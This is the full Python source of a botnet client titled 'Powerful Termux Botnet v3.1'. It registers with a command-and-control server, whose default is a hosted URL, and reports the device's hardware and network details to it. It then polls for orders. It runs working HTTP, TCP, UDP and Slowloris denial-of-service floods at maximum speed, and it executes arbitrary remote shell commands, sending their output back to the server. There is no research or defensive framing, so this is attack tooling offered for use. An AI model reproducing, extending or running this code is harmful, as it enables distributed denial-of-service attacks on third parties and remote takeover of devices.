import threading
import time
import sys
import uuid
import hashlib
import subprocess
import os
import socket
import random
import struct
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import http.client
import json

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Install requests: pip install requests")
    exit(1)

# Try to import optional dependencies
try:
    import psutil
except ImportError:
    psutil = None
    print("[!] Warning: psutil not available - limited system monitoring")


class PowerfulTermuxBot:
    def __init__(self):
        self.bot_id = self.generate_bot_id()
        self.running = True
        self.server_url = None
        self.approved = False
        self.active_attacks = []
        self.attack_lock = threading.Lock()
        self.connection_retries = 0
        self.max_retry_delay = 300  # Max 5 minutes between retries
        
        # Session pool for keep-alive and connection reuse
        self.session_pool = []
        self.pool_size = 50
        self.init_session_pool()
        
        # Enhanced system specs for Termux
        self.specs = {
            'bot_id': self.bot_id,
            'cpu_cores': self.get_cpu_count(),
            'cpu_freq': self.get_cpu_freq(),
            'ram_gb': self.get_ram_gb(),
            'ram_available': self.get_ram_available(),
            'os': 'termux-android' if self.is_termux() else sys.platform,
            'hostname': socket.gethostname(),
            'network_interfaces': self.get_network_info(),
            'capabilities': {
                'http': True,
                'tcp': True,
                'udp': True,
                'slowloris': True,
                'high_performance': True,
                'session_pooling': True
            }
        }
        
        # Attack stats
        self.stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'total_requests': 0,
            'uptime': time.time()
        }
        
        self.display_banner()
    
    def init_session_pool(self):
        """Create pool of reusable sessions for maximum speed"""
        for _ in range(self.pool_size):
            session = requests.Session()
            
            # Disable SSL verification for speed
            session.verify = False
            
            # Configure adapter for keep-alive
            adapter = HTTPAdapter(
                pool_connections=100,
                pool_maxsize=100,
                max_retries=0,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            self.session_pool.append(session)
    
    def get_session(self):
        """Get a session from the pool"""
        return random.choice(self.session_pool)
    
    def is_termux(self):
        """Check if running in Termux"""
        return os.path.exists('/data/data/com.termux')
    
    def get_cpu_count(self):
        """Get CPU count (Termux compatible)"""
        try:
            if psutil:
                return psutil.cpu_count()
            else:
                with open('/proc/cpuinfo', 'r') as f:
                    return sum(1 for line in f if line.startswith('processor'))
        except:
            return os.cpu_count() or 4
    
    def get_cpu_freq(self):
        """Get CPU frequency (Termux compatible)"""
        try:
            if psutil and psutil.cpu_freq():
                return round(psutil.cpu_freq().max, 2)
            else:
                with open('/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq', 'r') as f:
                    return round(int(f.read().strip()) / 1000, 2)
        except:
            return 0.0
    
    def get_ram_gb(self):
        """Get total RAM (Termux compatible)"""
        try:
            if psutil:
                return round(psutil.virtual_memory().total / (1024**3), 1)
            else:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemTotal'):
                            kb = int(line.split()[1])
                            return round(kb / (1024**2), 1)
        except:
            return 0.0
    
    def get_ram_available(self):
        """Get available RAM (Termux compatible)"""
        try:
            if psutil:
                return round(psutil.virtual_memory().available / (1024**3), 1)
            else:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemAvailable'):
                            kb = int(line.split()[1])
                            return round(kb / (1024**2), 1)
        except:
            return 0.0
    
    def check_internet_connection(self):
        """Check if internet is available"""
        try:
            # Try to connect to common DNS servers
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except OSError:
            pass
        
        try:
            # Try Google as fallback
            socket.create_connection(("www.google.com", 80), timeout=3)
            return True
        except OSError:
            pass
        
        return False
    
    def wait_for_internet(self):
        """Wait until internet connection is available"""
        print(f"\n[\033[1;31m✗\033[0m] No internet connection detected")
        print(f"[\033[1;33m⏳\033[0m] Waiting for internet connection...")
        
        dots = 0
        while not self.check_internet_connection():
            dots = (dots + 1) % 4
            print(f"\r[\033[1;33m...\033[0m] Checking connection" + "."*dots + " "*10, end='')
            time.sleep(5)
        
        print(f"\n[\033[1;32m✓\033[0m] Internet connection restored!")
        time.sleep(2)
        
    def calculate_retry_delay(self):
        """Calculate exponential backoff delay"""
        # Exponential backoff: 5s, 10s, 20s, 40s, 80s, up to max_retry_delay
        delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
        return delay
        
    def display_banner(self):
        """Display enhanced bot information"""
        print("\n" + "╔" + "═"*58 + "╗")
        print("║" + " "*10 + "\033[1;31mPOWERFUL TERMUX BOTNET v3.1\033[0m" + " "*17 + "║")
        print("╚" + "═"*58 + "╝")
        print(f"\n[\033[1;32m+\033[0m] BOT ID: \033[1;31m{self.bot_id}\033[0m")
        print(f"[\033[1;32m+\033[0m] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
        print(f"[\033[1;32m+\033[0m] RAM: {self.specs['ram_gb']}GB (Available: {self.specs['ram_available']}GB)")
        print(f"[\033[1;32m+\033[0m] OS: {self.specs['os']}")
        print(f"[\033[1;32m+\033[0m] Session Pool: {self.pool_size} connections")
        
        print(f"\n[\033[1;36m*\033[0m] POWER FEATURES:")
        print(f"    \033[1;32m✓\033[0m MULTI-THREADED ATTACKS")
        print(f"    \033[1;32m✓\033[0m CONNECTION POOLING")
        print(f"    \033[1;32m✓\033[0m KEEP-ALIVE OPTIMIZATION")
        print(f"    \033[1;32m✓\033[0m ZERO-DELAY REQUESTS")
        print(f"    \033[1;32m✓\033[0m RAW SOCKET FLOODS")
        print(f"    \033[1;32m✓\033[0m AUTO-RECONNECT ON DISCONNECT")
        
        print("\n" + "="*60)
        print("COPY YOUR BOT ID AND ADD IT IN THE SERVER DASHBOARD")
        print("="*60 + "\n")
        
    def generate_bot_id(self):
        """Generate unique bot ID"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
        return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            if psutil:
                interfaces = []
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                'name': interface,
                                'ip': addr.address
                            })
                return interfaces
            else:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                return [{'name': 'default', 'ip': ip}]
        except:
            return []
    
    def get_server_url(self):
        """Get server URL from user"""
        print("[\033[1;33m?\033[0m] Enter C2 Server URL:")
        print("    Examples:")
        print("    • http://localhost:5000")
        print("    • http://192.168.1.100:5000")
        print("    • http://your-server.com:5000")
        print("    Or press ENTER for default (https://c2-server-io.onrender.com)")
        url = input("\n\033[1;36m>>>\033[0m ").strip()
        
        if not url:
            url = "https://c2-server-io.onrender.com"
        
        return url.rstrip('/')
    
    def check_approval(self):
        """Check if bot is approved"""
        try:
            data = {
                'bot_id': self.bot_id,
                'specs': self.specs,
                'stats': self.stats
            }
            response = requests.post(
                f"{self.server_url}/check_approval", 
                json=data, 
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                result = response.json()
                self.connection_retries = 0  # Reset retry counter on success
                return result.get('approved', False)
        except requests.exceptions.RequestException:
            raise  # Re-raise to handle in caller
        except:
            pass
        return False
    
    def get_commands(self):
        """Poll for commands"""
        try:
            response = requests.get(
                f"{self.server_url}/commands/{self.bot_id}", 
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                self.connection_retries = 0  # Reset retry counter on success
                return response.json().get('commands', [])
        except requests.exceptions.RequestException:
            raise  # Re-raise to handle in caller
        except:
            pass
        return []
    
    def send_status(self, status, message):
        """Send enhanced status update"""
        try:
            self.stats['uptime'] = int(time.time() - self.stats['uptime'])
            
            data = {
                'bot_id': self.bot_id,
                'status': status,
                'message': message,
                'stats': self.stats,
                'active_attacks': len(self.active_attacks)
            }
            requests.post(
                f"{self.server_url}/status", 
                json=data, 
                timeout=5,
                verify=False
            )
            self.connection_retries = 0  # Reset retry counter on success
        except:
            pass
    
    def execute_command(self, cmd):
        """Execute command"""
        cmd_type = cmd.get('type')
        
        print(f"\n{'='*60}")
        print(f"[\033[1;36m→\033[0m] COMMAND: \033[1;33m{cmd_type}\033[0m")
        print(f"{'='*60}")
        
        try:
            if cmd_type == 'ping':
                self.cmd_ping()
            elif cmd_type == 'http_flood':
                self.cmd_http_flood(cmd)
            elif cmd_type == 'tcp_flood':
                self.cmd_tcp_flood(cmd)
            elif cmd_type == 'udp_flood':
                self.cmd_udp_flood(cmd)
            elif cmd_type == 'slowloris':
                self.cmd_slowloris(cmd)
            elif cmd_type == 'shell':
                self.cmd_shell(cmd)
            elif cmd_type == 'sysinfo':
                self.cmd_sysinfo()
            elif cmd_type == 'stop_all':
                self.cmd_stop_all()
            else:
                print(f"[\033[1;31m!\033[0m] Unknown: {cmd_type}")
                
        except Exception as e:
            print(f"[\033[1;31m!\033[0m] Error: {e}")
            self.send_status('error', str(e))
    
    def cmd_ping(self):
        """Respond to ping"""
        self.send_status('success', 'pong')
        print("[\033[1;32m✓\033[0m] Pong!")
    
    def cmd_http_flood(self, cmd):
        """MAXIMUM SPEED HTTP FLOOD - NO DELAYS"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 200)  # Use threads from server
        method = cmd.get('method', 'GET').upper()
        
        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED HTTP FLOOD\033[0m")
        print(f"    Target: {target}")
        print(f"    Method: {method}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {threads}")
        print(f"    Mode: \033[1;31mMAXIMUM SPEED (NO DELAYS)\033[0m")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'{method} SPEED FLOOD: {target}')
        
        attack_id = f"http_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        success_count = [0]
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        ]
        
        def speed_flood_worker():
            """EXTREME SPEED - NO DELAYS, NO TIMEOUTS"""
            end_time = time.time() + duration
            session = self.get_session()
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    
                    # Add random query params
                    params = {
                        '_': str(int(time.time() * 1000000)),  # Microsecond timestamp
                        'r': random.randint(1, 9999999),
                        'c': random.randint(1, 9999999)
                    }
                    
                    if method == 'GET':
                        r = session.get(target, headers=headers, params=params, timeout=3, verify=False)
                    elif method == 'POST':
                        payload = {'data': 'x' * random.randint(100, 2000)}
                        r = session.post(target, headers=headers, data=payload, timeout=3, verify=False)
                    elif method == 'HEAD':
                        r = session.head(target, headers=headers, params=params, timeout=3, verify=False)
                    else:
                        r = session.get(target, headers=headers, params=params, timeout=3, verify=False)
                    
                    request_count[0] += 1
                    if r.status_code < 500:
                        success_count[0] += 1
                        
                    # ZERO DELAY - SPAM AS FAST AS POSSIBLE
                    
                except:
                    request_count[0] += 1
                    # Continue immediately on error
        
        # Launch massive thread pool
        print(f"[\033[1;32m+\033[0m] Launching {threads} attack threads...")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(speed_flood_worker) for _ in range(threads)]
            
            # Monitor with live stats
            start = time.time()
            last_count = 0
            
            while time.time() - start < duration and attack_id in self.active_attacks:
                time.sleep(1)
                elapsed = time.time() - start
                
                current = request_count[0]
                rps = (current - last_count)  # Requests in last second
                avg_rps = current / elapsed if elapsed > 0 else 0
                
                print(f"\r[\033[1;31m⚡\033[0m] Total: {current:,} | "
                      f"RPS: \033[1;33m{rps:,}\033[0m | "
                      f"Avg: {avg_rps:.0f} | "
                      f"Success: {success_count[0]:,}", end='')
                
                last_count = current
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[\033[1;32m✓\033[0m] FLOOD COMPLETE: \033[1;31m{request_count[0]:,}\033[0m requests sent!")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'Speed flood: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
    
    def cmd_tcp_flood(self, cmd):
        """HIGH-SPEED TCP FLOOD"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 100)  # Use threads from server
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 80
        
        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED TCP FLOOD\033[0m")
        print(f"    Target: {host}:{port}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {threads}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'TCP SPEED FLOOD: {host}:{port}')
        
        attack_id = f"tcp_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        
        def tcp_speed_worker():
            """Rapid TCP connections"""
            end_time = time.time() + duration
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((host, port))
                    
                    # Send junk data
                    payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(512)
                    sock.send(payload)
                    sock.close()
                    
                    request_count[0] += 1
                    # NO DELAY
                except:
                    request_count[0] += 1
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(tcp_speed_worker) for _ in range(threads)]
            
            start = time.time()
            while time.time() - start < duration:
                time.sleep(1)
                print(f"\r[\033[1;31m⚡\033[0m] TCP Connections: {request_count[0]:,}", end='')
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[\033[1;32m✓\033[0m] TCP flood: {request_count[0]:,} connections")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'TCP flood: {request_count[0]:,} conn')
    
    def cmd_udp_flood(self, cmd):
        """HIGH-SPEED UDP FLOOD"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        threads = cmd.get('threads', 100)  # Use threads from server
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 53
        
        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED UDP FLOOD\033[0m")
        print(f"    Target: {host}:{port}")
        print(f"    Duration: {duration}s")
        print(f"    Threads: {threads}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'UDP SPEED FLOOD: {host}:{port}')
        
        attack_id = f"udp_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        request_count = [0]
        
        def udp_speed_worker():
            """Rapid UDP packets"""
            end_time = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    # Large random payload
                    payload = os.urandom(random.randint(1024, 4096))
                    sock.sendto(payload, (host, port))
                    request_count[0] += 1
                    # NO DELAY - MAXIMUM SPEED
                except:
                    pass
            
            sock.close()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_speed_worker) for _ in range(threads)]
            
            start = time.time()
            while time.time() - start < duration:
                time.sleep(1)
                print(f"\r[\033[1;31m⚡\033[0m] UDP Packets: {request_count[0]:,}", end='')
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks.remove(attack_id)
        
        print(f"\n[\033[1;32m✓\033[0m] UDP flood: {request_count[0]:,} packets")
        self.stats['total_requests'] += request_count[0]
        self.stats['successful_attacks'] += 1
        self.send_status('success', f'UDP flood: {request_count[0]:,} packets')
    
    def cmd_slowloris(self, cmd):
        """Slowloris attack"""
        target = cmd['target']
        duration = cmd.get('duration', 60)
        sockets_count = cmd.get('sockets', 300)  # Use sockets from server
        
        parsed = urlparse(target if '://' in target else 'http://' + target)
        host = parsed.hostname
        port = parsed.port or 80
        
        print(f"[\033[1;36m*\033[0m] Slowloris Attack")
        print(f"    Target: {host}:{port}")
        print(f"    Duration: {duration}s")
        print(f"    Sockets: {sockets_count}")
        
        self.stats['total_attacks'] += 1
        self.send_status('running', f'Slowloris: {host}:{port}')
        
        attack_id = f"slow_{int(time.time())}"
        with self.attack_lock:
            self.active_attacks.append(attack_id)
        
        sockets_list = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                return s
            except:
                return None
        
        for _ in range(sockets_count):
            s = create_socket()
            if s:
                sockets_list.append(s)
        
        print(f"[\033[1;32m✓\033[0m] Created {len(sockets_list)} sockets")
        
        end_time = time.time() + duration
        while time.time() < end_time and attack_id in self.active_attacks:
            for s in list(sockets_list):
                try:
                    s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets_list.remove(s)
                    new_s = create_socket()
                    if new_s:
                        sockets_list.append(new_s)
            
            print(f"\r[\033[1;36m→\033[0m] Active: {len(sockets_list)}", end='')
            time.sleep(10)
        
        for s in sockets_list:
            try:
                s.close()
            except:
                pass
        
        with self.attack_lock:
            if attack_id in self.active_attacks:
                self.active_attacks.remove(attack_id)
        
        print(f"\n[\033[1;32m✓\033[0m] Slowloris done")
        self.stats['successful_attacks'] += 1
        self.send_status('success', 'Slowloris complete')
    
    def cmd_shell(self, cmd):
        """Execute shell command"""
        command = cmd.get('command')
        print(f"[\033[1;36m*\033[0m] Shell: {command}")
        
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
            output = result.decode('utf-8', errors='ignore')[:500]
            print(f"[\033[1;32m+\033[0m] Output:\n{output}")
            self.send_status('success', output)
        except Exception as e:
            print(f"[\033[1;31m!\033[0m] Error: {e}")
            self.send_status('error', str(e))
    
    def cmd_sysinfo(self):
        """System info"""
        info_lines = []
        
        if psutil:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            info_lines.append(f"CPU: {cpu_percent}%")
            info_lines.append(f"RAM: {mem.percent}% ({mem.used/(1024**3):.1f}GB/{mem.total/(1024**3):.1f}GB)")
        else:
            info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
        
        info_lines.append(f"Active Attacks: {len(self.active_attacks)}")
        info_lines.append(f"Total Attacks: {self.stats['total_attacks']}")
        info_lines.append(f"Total Requests: {self.stats['total_requests']:,}")
        
        info = '\n'.join(info_lines)
        print(f"[\033[1;36m*\033[0m] System:\n{info}")
        self.send_status('success', info)
    
    def cmd_stop_all(self):
        """Stop all attacks"""
        print(f"[\033[1;33m!\033[0m] Stopping...")
        
        with self.attack_lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
        
        print(f"[\033[1;32m✓\033[0m] Stopped {count} attacks")
        self.send_status('success', f'Stopped {count}')
    
    def run(self):
        """Main loop with auto-reconnect"""
        self.server_url = self.get_server_url()
        
        while self.running:
            try:
                # Check internet connection first
                if not self.check_internet_connection():
                    self.wait_for_internet()
                    self.connection_retries = 0  # Reset retries after internet restored
                
                print(f"\n[\033[1;36m*\033[0m] Server: {self.server_url}")
                print(f"[\033[1;36m*\033[0m] Waiting for approval...\n")
                
                # Wait for approval with reconnect logic
                dots = 0
                self.approved = False
                
                while not self.approved:
                    try:
                        # Check internet before attempting connection
                        if not self.check_internet_connection():
                            self.wait_for_internet()
                            continue
                        
                        if self.check_approval():
                            self.approved = True
                            print("\n\n" + "="*60)
                            print("\033[1;32m✓ BOT APPROVED! READY FOR ATTACKS\033[0m")
                            print("="*60 + "\n")
                            break
                        else:
                            dots = (dots + 1) % 4
                            print(f"[\033[1;33m...\033[0m] Waiting (ID: \033[1;31m{self.bot_id}\033[0m)" + "."*dots + " "*10, end='\r')
                            time.sleep(5)
                            
                    except requests.exceptions.RequestException as e:
                        # Connection error - implement retry with backoff
                        self.connection_retries += 1
                        delay = self.calculate_retry_delay()
                        
                        print(f"\n[\033[1;31m✗\033[0m] Connection lost: {type(e).__name__}")
                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
                        
                        # Wait with countdown
                        for remaining in range(delay, 0, -1):
                            if not self.check_internet_connection():
                                self.wait_for_internet()
                                break
                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
                            time.sleep(1)
                        
                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
                        
                    except KeyboardInterrupt:
                        print("\n[\033[1;31m!\033[0m] Exiting...")
                        return
                    except Exception as e:
                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
                        time.sleep(10)
                
                print(f"[\033[1;32m+\033[0m] Active. Listening...\n")
                
                # Main command loop with reconnect
                while self.running and self.approved:
                    try:
                        # Check internet periodically
                        if not self.check_internet_connection():
                            print(f"\n[\033[1;31m✗\033[0m] Internet connection lost during operation")
                            self.wait_for_internet()
                            # Break to outer loop to re-establish server connection
                            self.approved = False
                            break
                        
                        commands = self.get_commands()
                        for cmd in commands:
                            threading.Thread(target=self.execute_command, args=(cmd,), daemon=True).start()
                        
                        time.sleep(5)
                        
                    except requests.exceptions.RequestException as e:
                        # Connection error during operation
                        self.connection_retries += 1
                        delay = self.calculate_retry_delay()
                        
                        print(f"\n[\033[1;31m✗\033[0m] Lost connection to C2 server: {type(e).__name__}")
                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s...")
                        
                        # Wait with countdown
                        for remaining in range(delay, 0, -1):
                            if not self.check_internet_connection():
                                self.wait_for_internet()
                                break
                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
                            time.sleep(1)
                        
                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
                        
                        # Break to outer loop to re-establish connection
                        self.approved = False
                        break
                        
                    except KeyboardInterrupt:
                        print("\n[\033[1;31m!\033[0m] Stopping...")
                        self.cmd_stop_all()
                        self.running = False
                        return
                        
                    except Exception as e:
                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
                        time.sleep(10)
                
            except KeyboardInterrupt:
                print("\n[\033[1;31m!\033[0m] Exiting...")
                self.running = False
                return


if __name__ == '__main__':
    print("\n╔" + "═"*58 + "╗")
    print("║" + " "*12 + "\033[1;31mPOWERFUL TERMUX BOTNET\033[0m" + " "*20 + "║")
    print("╚" + "═"*58 + "╝")
    
    try:
        client = PowerfulTermuxBot()
        client.run()
    except KeyboardInterrupt:
        print("\n[\033[1;31m!\033[0m] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[\033[1;31m!\033[0m] Fatal error: {e}")
        sys.exit(1)


